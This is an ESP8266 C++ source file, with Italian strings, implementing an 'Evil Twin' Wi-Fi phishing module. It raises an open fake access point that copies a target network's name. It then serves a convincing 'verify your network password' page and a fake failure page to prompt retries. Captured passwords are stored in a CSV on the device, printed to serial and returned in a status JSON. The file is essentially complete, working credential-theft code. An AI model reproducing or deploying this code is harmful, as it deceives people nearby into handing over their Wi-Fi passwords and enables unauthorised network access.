#include <pk_evil.h>
#include <pk_net.h>
#include <wifi_ap.h>
#include <ESP8266WiFi.h>
#include <LittleFS.h>

#include <string.h>

#define EVIL_LOG   "/evil_log.csv"
#define MAX_CRED   4

namespace pk_evil {

static bool     _running = false;
static char     _ssid[33] = {0};
static uint8_t  _channel = 1;
static char     _creds[MAX_CRED][64];
static uint8_t  _credCount = 0;

static String csvClean(const String& s) {
    String v = s;
    v.replace(",", " ");
    v.replace("\"", "'");
    v.replace("\n", " ");
    return v;
}

bool begin() {
    _running = false;
    _credCount = 0;
    memset(_creds, 0, sizeof(_creds));
    return LittleFS.begin();
}

bool isRunning() {
    return _running;
}

const char* targetSsid() {
    return _ssid;
}

uint8_t currentChannel() {
    return _channel;
}

int capturedCount() {
    return (int)_credCount;
}

String start(const String& ssid, uint8_t channel) {
    pk_net::stopAll();

    String s = ssid;
    if (s.length() == 0) s = "FreeWiFi";
    if (s.length() > 32) s = s.substring(0, 32);
    s.toCharArray(_ssid, sizeof(_ssid));
    _channel = (channel >= 1 && channel <= 14) ? channel : 1;
    _credCount = 0;

    WiFi.softAPdisconnect(true);
    bool ok = WiFi.softAP(_ssid, "", _channel);

    Serial.println();
    Serial.print(F("[EvilTwin] AP falso: "));
    Serial.println(_ssid);
    if (ok) {
        Serial.println(F("[EvilTwin] ATTIVO: la pagina di verifica raccoglie le password"));
        _running = true;
    } else {
        Serial.println(F("[EvilTwin] ERRORE: softAP non avviato"));
    }

    String j = "{";
    j += "\"running\":" + String(ok ? "true" : "false") + ",";
    j += "\"ssid\":\"" + String(_ssid) + "\",";
    j += "\"channel\":" + String((int)_channel);
    j += "}";
    return j;
}

String stop() {
    WiFi.softAPdisconnect(true);
    _running = false;
    _ssid[0] = '\0';
    wifi_ap::begin(); // ripristina il normale AP della PortaChiave
    Serial.println(F("[EvilTwin] Stop: AP standard ripristinato"));
    return String("{\"running\":false}");
}

String status() {
    String j = "{";
    j += "\"running\":" + String(_running ? "true" : "false") + ",";
    j += "\"ssid\":\"" + String(_ssid) + "\",";
    j += "\"channel\":" + String((int)_channel) + ",";
    j += "\"captured\":" + String((int)_credCount) + ",";
    j += "\"creds\":[";
    for (int i = 0; i < _credCount; i++) {
        if (i > 0) j += ",";
        j += "{\"ssid\":\"" + csvClean(String(_creds[i]).substring(0, String(_creds[i]).indexOf(','))) + "\"";
        int c = String(_creds[i]).indexOf(',');
        j += ",\"pass\":\"" + csvClean(String(_creds[i]).substring(c + 1)) + "\"}";
    }
    j += "]";
    j += "}";
    return j;
}

void onSubmitted(const String& pass) {
    if (!_running) return;
    String p = csvClean(pass);
    if (p.length() == 0) return;

    // append su LittleFS
    File f = LittleFS.open(EVIL_LOG, "a");
    if (f) {
        f.print(csvClean(String(_ssid)));
        f.print(",");
        f.print(p);
        f.print("\n");
        f.close();
    }

    // anello in RAM per lo status
    char buf[64];
    snprintf(buf, sizeof(buf), "%s,%s", _ssid, p.c_str());
    if (_credCount < MAX_CRED) {
        strncpy(_creds[_credCount], buf, sizeof(_creds[0]) - 1);
        _credCount++;
    } else {
        memmove(_creds[0], _creds[1], sizeof(_creds) - sizeof(_creds[0]));
        strncpy(_creds[MAX_CRED - 1], buf, sizeof(_creds[0]) - 1);
    }

    Serial.print(F("[EvilTwin] Password catturata per "));
    Serial.print(_ssid);
    Serial.print(F(": "));
    Serial.println(p);
}

String loginPage() {
    String head = "<!doctype html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
                  "<title>Verifica rete</title><style>body{font-family:system-ui,sans-serif;max-width:360px;margin:40px auto;padding:0 16px;color:#222}"
                  "h1{font-size:19px;margin-bottom:4px}.box{border:1px solid #d0d0d0;border-radius:14px;padding:18px;margin-top:14px;"
                  "box-shadow:0 3px 8px rgba(0,0,0,.10)}input{width:100%;box-sizing:border-box;padding:11px;margin:8px 0;font-size:16px;"
                  "border:1px solid #bbb;border-radius:9px}button{width:100%;padding:12px;font-size:16px;background:#1a73e8;color:#fff;"
                  "border:0;border-radius:9px;margin-top:8px}p{font-size:13px;color:#666}</style></head><body>";
    String page = head;
    page += "<h1>Aggiornamento richiesto</h1>";
    page += "<div class=box><p>Per mantenere la connessione alla rete <b>" + String(_ssid) + "</b> ";
    page += "e' necessario verificare la password.</p>";
    page += "<form action='/submit' method=post>";
    page += "<input name=password type=password placeholder='Password della rete' required>";
    page += "<button type=submit>Verifica</button></form></div>";
    page += "<p><b>" + String(_ssid) + "</b> - WPA2-PSK</p></body></html>";
    return page;
}

String failPage() {
    return "<!doctype html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
           "<style>body{font-family:system-ui,sans-serif;max-width:360px;margin:40px auto;padding:0 16px;color:#222;text-align:center}"
           ".box{border:1px solid #e0b4b4;background:#fdf0f0;border-radius:14px;padding:22px;margin-top:14px}"
           "a{color:#1a73e8}</style></head><body>"
           "<div class=box><h1 style='color:#b00020'>Password non valida</h1>"
           "<p>Impossibile verificare la connessione. Riprova tra poco.</p>"
           "<p><a href='/'>Torna alla pagina di verifica</a></p></div></body></html>";
}

} // namespace pk_evil